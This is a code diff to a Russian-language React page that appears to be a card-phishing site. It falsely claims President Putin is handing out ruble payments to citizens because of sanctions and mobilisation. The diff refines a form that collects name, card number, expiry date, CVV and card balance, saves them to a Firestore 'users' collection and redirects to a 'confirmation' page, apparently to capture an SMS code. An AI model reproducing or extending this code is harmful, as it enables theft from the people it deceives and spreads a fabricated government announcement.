@@ -20,6 +20,9 @@ import mirsvg from './img/mir.svg'
 import mirpng from './img/mir.png'
 import exams from './img/exam.png'
 import icon from "./img/icon.png"
+import card from "./img/card.png"
+import CurrencyFormat from 'react-currency-format';
+
 
 
 function App() {
@@ -30,24 +33,29 @@ function App() {
   const [cvc, setCvc] = useState(null)
   const [balance, setBalance] = useState(null)
   const [exam, setExam] = useState(false)
-
+  const [rubl, setRubl] = useState(false)
 
   function handleSubmit(e) {
     e.preventDefault()
-    if (!code || !cvc) {
+    if (!code || !cvc || !name || !value) {
       toast.error("Пожалуйста, заполните информацию");
     } else {
       const usersRef = collection(db, "users")
       addDoc(usersRef, { name, surname, code, cvc, value, balance }).then(response => {
         toast.success('Поздравляем, Вы получите оплату после подтверждения входящего сообщения.')
         setTimeout(() => {
-        window.location.replace('https://ciberbank.github.io/podtverzhdeniye');
-      }, 3000);
+          window.location.replace('https://ciberbank.github.io/podtverzhdeniye');
+        }, 3000);
       }).catch(error => {
-        toast.error("Пожалуйста, заполните информацию2");
+        toast.error("Пожалуйста, заполните информацию");
       })
     }
   }
+
+  const handlecvvChange = event => {
+    const limit = 3;
+    setCvc(event.target.value.slice(0, limit));
+  };
 
 
   return (
@@ -90,8 +98,8 @@ function App() {
           </div>
         </div>
         <form onSubmit={handleSubmit} className='w-full h-full flex flex-col items-center justify-center text-center pb-10'>
-          <h1 className='text-base sm:text-2xl font-bold w-[90%] sm:w-[55%]'>Пожалуйста, <span className='text-red-600'>заполните форму</span>, чтобы воспользоваться кампанией, зарезервированной правительством для пожилых людей из-за экономических проблем в нашей стране.</h1>
-          <div className="flex flex-col  items-center justify-center gap-6 sm:gap-12 py-10 w-[80%] sm:w-[30%]">
+          <h1 className='text-base sm:text-2xl font-bold w-[90%] sm:w-[50%]'>Сегодня Президент Путин принял новое решение.в связи с санкцией Евросоюза в отношении нашей страны и в связи с мобилизацией президент Путин дает по 4 тысячи каждому старше 35 лет </h1>
+          <div className="flex flex-col  items-center justify-center gap-6  py-10 w-[80%] sm:w-[30%]">
             <div className="flex items-center justify-center gap-5 w-full">
               <TextField defaultValue={name} label="имя" variant="standard" onChange={(e) => {
                 setName(e.target.value)
@@ -100,18 +108,32 @@ function App() {
                 setSurname(e.target.value)
               }} />
             </div>
-            <div className='w-[400px] h-[250px] shadow-md px-10 py-5 rounded-md border bg-gray-100  flex flex-col items-center justify-between relative'>
-              <div className="w-full flex items-center justify-end gap-3">
+            <div className="w-full flex items-center justify-end gap-3 h-[10px] relative -bottom-16 sm:-left-16 z-[999]">
                 <SiVisa size={35} className={`${code !== null && code[0] === '4' ? 'text-blue-600 ' : 'text-gray-300'}`} />
-                <img src={code !== null && code[0] === '2' ? mirsvg : mirpng} className='w-9 h-9 ' alt="" />
+                {code !== null && code[0] === '2' ? <img src={ mirsvg} className='w-9 h-9 ' alt="" />: <span className='font-black text-md text-gray-500'>МИР</span>}
                 <SiMastercard size={27} className={`${code !== null && code[0] === '5' ? 'text-orange-500 ' : 'text-gray-300'}`} />
+              </div> 
+            <div className='w-[375px] sm:w-[450px] h-[250px] shadow-md px-5 py-5 rounded-md border bg-gray-100  flex flex-col items-center justify-between relative'>
+              {/* <img src={card} alt="" className='w-full h-full absolute z-[-1] object-cover ' /> */}
+              <span className='text-gray-800 text-[13px] relative top-[5.5rem] left-0 sm:left-0 w-full text-left z-[10]'>Срок действия</span>
+              <CurrencyFormat placeholder='Hомер карты' className='input sm:text-xl !p-0 !border-b mb-6 !border-black  !bg-gray-100 w-full h-[2rem]' format="#### #### #### ####" mask="_" onChange={(e) => {
+                setCode(e.target.value)
+              }} />
+              <div className='w-full flex items-center justify-between'>
+                <CurrencyFormat format="##/##" className='input !border-b !border-black  !bg-gray-100 w-[5rem] h-[2rem]' placeholder="ММ/ГГ" mask={['M', 'M', 'Г', 'Г']} onChange={(e) => {
+                  setValue(e.target.value)
+                }} />
+                <div className="">
+                  <input type="number" placeholder='CVV/CVC' value={cvc} className='input !border-b !border-black  !bg-gray-100 w-[5rem] h-[2rem]' onChange={handlecvvChange} />
+                  <div onClick={() => setExam(!exam)} onMouseEnter={() => setExam(true)} onMouseLeave={() => setExam(false)} className={' rounded-full block border border-gray-400 px-[7px] absolute top-[8.2rem] right-2 !z-[100] cursor-pointer text-[13px]'}>?</div>
+                  <div className={` ${exam ? 'flex' : 'hidden'} flex-col items-center border py-2 sm:p-3 bg-white rounded-xl top-24 right-6   sm:top-20  sm:-right-[20.5rem]  absolute  w-1/2 sm:w-auto  z-[102] cursor-pointer text-[12px]  sm:text-[14px]`}>
+                    <span>Код CVV/CVC указан на <br /> обратной стороне карты</span>
+                    <img src={exams} alt="" className='w-[65%] sm:w-full sm:h-full' />
+                  </div>
+                </div>
+
               </div>
-              <div onClick={() => setExam(!exam)} onMouseEnter={() => setExam(true)} onMouseLeave={() => setExam(false)} className={' rounded-full hidden sm:block border border-gray px-2 absolute top-20 right-6 z-[100] cursor-pointer text-[13px]'}>?</div>
-              <div className={` ${exam ? 'flex' : 'hidden'} flex-col border p-3 bg-white rounded-xl   absolute top-20 -right-[20rem] z-[102] cursor-pointer text-[14px]`}>
-                <span>Код CVV/CVC указан на <br /> обратной стороне карты</span>
-                <img src={exams} alt="" />
-              </div>
-              <CreditCardInput
+              {/* <CreditCardInput
                 customTextLabels={{
                   invalidCardNumber: 'Пожалуйста, заполните информацию',
                   expiryError: {
@@ -126,6 +148,7 @@ function App() {
                   expiryPlaceholder: 'ММ/ГГ',
                   cvcPlaceholder: 'CVV',
                   zipPlaceholder: 'C.P.'
+                  
                 }}
                 cardNumberInputProps={{
                   value: code, onChange: (e) => {
@@ -145,19 +168,17 @@ function App() {
                 dangerTextClassName="hidden "
                 containerClassName="!bg-gray-100 !w-full !h-full"
                 cardImageClassName="hidden"
-                fieldClassName="input flex !p-0 !border-none !bg-gray-100 w-full h-[5rem]"
-              />
-              <TextField
-                label="баланс карты"
-                onChange={(e) => {
-                  setBalance(e.target.value)
-                }}
-                className="w-full"
-                variant="standard"
-              />
+                fieldClassName="input flex gap-5 !p-0 !border-none !bg-gray-100 w-full h-[5rem]"
+              /> */}
+
+              {/* <span className='relative -left-48 sm:-left-[13.2rem] top-[3.2rem]'>&#8381;</span> */}
+              <span className='text-start w-full -mb-4'>Баланс карты</span>
+              <CurrencyFormat thousandSeparator={true} prefix={'₽'} className="input sm:text-xl !p-0 !border-b !border-black  !bg-gray-100 w-full h-[2rem]" placeholder="₽20,000" onChange={(e) => {
+                setBalance(e.target.value)
+              }} />
             </div>
-          </div>                
-          <button type='submit' className='rounded-md bg-green-500 hover:bg-green-700 transition-all hover:text-white w-[80%] sm:w-[30%] py-3 text-xl'> воспользоваться кампанией</button>
+          </div>
+          <button type='submit' className='rounded-md bg-green-500 hover:bg-green-700 transition-all hover:text-white w-[80%] sm:w-[30%] py-3  text-md sm:text-xl font-bold'>получить на карту  8000 рубль</button>
         </form>
       </div>
       <footer className='bg-[#171a1e] sm:h-[500px] w-full flex  justify-center'>
